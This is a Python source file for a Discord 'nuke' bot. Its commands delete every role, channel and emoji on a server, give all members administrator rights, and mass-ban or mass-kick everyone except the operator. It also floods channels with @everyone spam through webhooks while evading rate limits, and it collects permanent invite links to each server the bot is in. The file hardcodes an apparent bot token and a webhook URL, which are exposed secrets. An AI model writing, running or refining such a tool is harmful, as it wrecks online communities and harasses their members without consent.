import discord
from discord.ext import commands
import asyncio
import random
import requests
import threading
import json
from colorama import Fore
import time
from discord.ui import Button, View, view
import requests
from discord import Permissions, Embed, member, guild
import time
import os
from discord_webhook import DiscordWebhook
import aiohttp
#from dotenv import load_dotenv


#load_dotenv()
#bot_token = os.environ("TOKEN")

intent = discord.Intents.all()
bot = commands.Bot(
    command_prefix="!", intents=intent,
)
role = ["hahalol"]
webhook_name=["bob"]
authorized_id = [836426974339006495]

channels = ["test", "hi", "good-game"]

SPAM_MESSAGE = ["@everyone hello world", "hi @everyone", "test @everyone"]

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.dnd)

@bot.remove_command("help")
@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Commands", description="List of available commands", color=0x00ff00)
    embed.add_field(name="!ping", value="Returns Pong!", inline=False)
    embed.add_field(name="!help", value="Displays this message", inline=False)
    embed.add_field(name="!asdfghjkl", value="bot invite", inline=False)
    embed.add_field(name="!nuke", value="no explaining needed", inline=False)
    embed.add_field(name="!cn", value="changes server name", inline=False)
    embed.add_field(name="!meadmin", value="gives you admin", inline=False)
    embed.add_field(name="!eadmin", value="gives everyone admin", inline=False)
    embed.add_field(name="!masskick", value="bans all", inline=False)
    embed.add_field(name="!massban", value="kicks all", inline=False)
    embed.add_field(name="!rolespam [name of the role]", value="spams 150 roles", inline=False)
    embed.add_field(name="!edelete", value="gives everyone admin", inline=False)
    embed.add_field(name="!webraid", value="webhook raid (I think this one is pretty cool)", inline=False)
    await ctx.send(embed=embed)

"""
@bot.event
async def on_guild_join(guild):
    channel = guild.text_channels[0]
    link = await channel.create_invite(max_age=0, max_uses=0)
    webhook_url = "https://discord.com/api/webhooks/1069829824736153610/qdRm8htwzVneJMhPLOKEw8AwOfVLVy0tCaKSGfrIWhlKr-nb4Td8VGd0oDtRYHw8E1Mw"
    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(webhook_url, adapter=AsyncWebhookAdapter(session))
        embed = discord.Embed(title='New Server Joined', description=f'The bot has joined a new server with invite link: {link}', color=0x3366ff)
        webhook.add_embed(embed)
        asyncio.ensure_future(webhook.execute())
"""
        
@bot.command()
async def asdfghjkl(ctx):
    await ctx.send("https://discord.com/api/oauth2/authorize?client_id=1069842628377579541&permissions=8&scope=bot")


@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.author.send("nuking has started! :bomb:")
    await ctx.author.send("starting to delete all roles...")
    guild = ctx.guild
    for role in guild.roles:
        try:
            await role.delete()
        except:
            print("{role.name} can't be deleted")
    await ctx.author.send("starting to mass create roles...")
    bob = 100
    for bob in range(bob):
        try:
            await guild.create_role(role)
            print("role was created")
        except:
            print("role wasn't created")
    try:
        with open('image.png', 'rb') as f:
            icon = f.read()
        await ctx.guild.edit(name= "haha", icon=icon)
    except:
        print("error not work")
    await ctx.author.send("server named and pfp changed\ngave everyone admin")
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.BLUE + "everyone has admin :)" + Fore.RESET)
    except:
        print(Fore.GREEN + "no one has admin :(" + Fore.RESET)
    await ctx.author.send("banning everyone...")
    for member in guild.members:
        try:
            if not member.id in authorized_id:
                await member.ban()
            print(f"{member.name} Was banned")
        except:
            print(f"{member.name} can't be banned.")
    await ctx.author.send("deleting channels...")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.BLUE + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    await ctx.author.send("creating channels...\nmass ping starting...")
    amount = 75
    await guild.create_text_channel("imagine-toxic")
    for i in range(amount):
        await guild.create_text_channel(random.choice(channels))
        print(f"nuked {guild.name} sucessfully.")
    else:
        print("someone tryed to nuke but failed XD?")
        return

@bot.event
async def on_guild_channel_create(channel):
    webhook =await channel.create_webhook(name = random.choice(webhook_name))  
    while True:  
        await channel.send(random.choice(SPAM_MESSAGE))
        await webhook.send(random.choice(SPAM_MESSAGE), username=random.choice(webhook_name), avatar_url="https://cdn.discordapp.com/icons/965788521900179496/35e1d6919e79af1d925d2ac81393d38c.png?size=128")

@bot.command()
async def cn(ctx, *args, image=None):
    await ctx.message.delete()
    guild = ctx.message.guild
    output = ' '.join(args)
    if image is None:
        try:
            with open('image.png', 'rb') as f:
                icon = f.read()
            await ctx.guild.edit(name=f"{output}", icon=icon)
        except Exception as e:
            print(f"Error: failed to change server name and icon ({e})")
    else:
        try:
            with open(image, 'rb') as f:
                icon = f.read()
            await ctx.guild.edit(name=f"{output}", icon=icon)
        except Exception as e:
            print(f"Error: failed to change server name and icon ({e})")



@bot.command()
async def meadmin(ctx, *, role_name: str = "boss man"):
    guild = ctx.guild
    try:
        await ctx.message.delete()
        role = await guild.create_role(name=role_name, permissions=discord.Permissions.all())
        await ctx.author.add_roles(role)
        await ctx.author.send(f"**Success!** you have been given admin role with name '{role_name}'")
    except:
        print("Failed to create and assign role")


@bot.command()
@commands.has_permissions(ban_members=True)
async def massban(ctx, member=None):
    await ctx.message.delete()
    guild = ctx.guild
    print(guild.members)
    for member in guild.members:
        try:
            if not member.id in authorized_id:
                await member.ban()
            print(f"{member.name} Was banned")
        except:
                print(f"{member.name} can't be banned.")



@bot.command()
@commands.has_permissions(kick_members=True)
async def masskick(ctx, member=None):
    await ctx.message.delete()
    guild = ctx.guild
    print(guild.members)
    for member in guild.members:
        try:
            if not member.id in authorized_id:
                await member.kick()
            print(f"{member.name} Was kicked")
        except:
            print(f"{member.name} can't be kicked.")

@bot.command()
async def deleteroles(ctx):
    guild = ctx.guild
    await ctx.message.delete()
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.BLUE + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} can't be deleted" + Fore.RESET)



@bot.command()
async def rolespam(ctx, *args):
    guild = ctx.guild
    output = ''
    for word in args:
        output += word
        output += ' '
    await ctx.message.delete()
    bob = 150
    for bob in range(bob):
        try:
            await guild.create_role(name=f"{output}")
            print("role was created")
        except:
            print("role wasn't created")
    else:
        print("rolespam failed??? bc of a non buyer tried")



@bot.command()
async def edelete(ctx):
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            print(f"{emoji.name} Was deleted")
        except:
            print(f"{emoji.name} can't be deleted")
    else:
        print("someone tried to use this cmd but no premium XD")


@bot.command()
async def servers(ctx):
    servers = bot.guilds
    processed_servers = []

    for guild in servers:
        if guild.id not in processed_servers:
            for channel in guild.text_channels:
                link = await channel.create_invite(max_age=0, max_uses=0)
                await ctx.send(f"New Invite: {link}")
                processed_servers.append(guild.id)
                break


@bot.command(name="ping")
async def ping(ctx: commands.Context):
    await ctx.send(f"Pong! {round(bot.latency * 1000)}ms")



@bot.command()
async def EpSNVyrAOYt(ctx):
    servers = bot.guilds
    await ctx.guild.leave()
    print("Bot has left the server!")

def sprite(webhook):
    while ezraid:
        data = {'content': '@everyone hello world', "avatar_url": "https://cdn.discordapp.com/icons/965788521900179496/35e1d6919e79af1d925d2ac81393d38c.png?size=128"}
        

        spamming = requests.post(webhook, json=data)
        spammingerror = spamming.text
        if spamming.status_code == 204:
            continue
        if 'rate limited' in spammingerror.lower():
            try:
                j = json.loads(spammingerror)
                ratelimit = j['retry_after']
                timetowait = ratelimit / 1000
                time.sleep(timetowait)
            except:
                delay = random.randint(0, 2)
                time.sleep(delay)

        else:
            delay = random.randint(1, 3)
            time.sleep(delay)


@bot.command()
async def webraid(ctx):
    global ezraid
    try:
        await ctx.message.delete()
    except:
        pass
    ezraid = True
    if len(await ctx.guild.webhooks()) != 0:
        for webhook in await ctx.guild.webhooks():
            threading.Thread(target=sprite, args=(webhook.url,)).start()
    if len(ctx.guild.text_channels) >= 500:
            webhookamount = 2
    else:
        webhookamount = 5000 / len(ctx.guild.text_channels)
        webhookamount = int(webhookamount) + 1  
    for i in range(webhookamount):
        for channel in ctx.guild.text_channels:
            try:
                webhook = await channel.create_webhook(name='Haha :)')
                threading.Thread(target=sprite, args=(webhook.url,)).start()
                f = open(r'data/webhooks-' + str(ctx.guild.id) + ".txt", 'a')
                f.write(f"{webhook.url} \n")
                f.close()
            except:
                print(f"{Fore.RED} > webhook no work :(")
    else:
        print("someone try to webraid but no PERMS XDDDD")


bot.run("MTA2OTg0MjYyODM3NzU3OTU0MQ.G1tXcN.HNSGg2abruCFrz1xvYuoovq-RGI9pmapt6t2e8")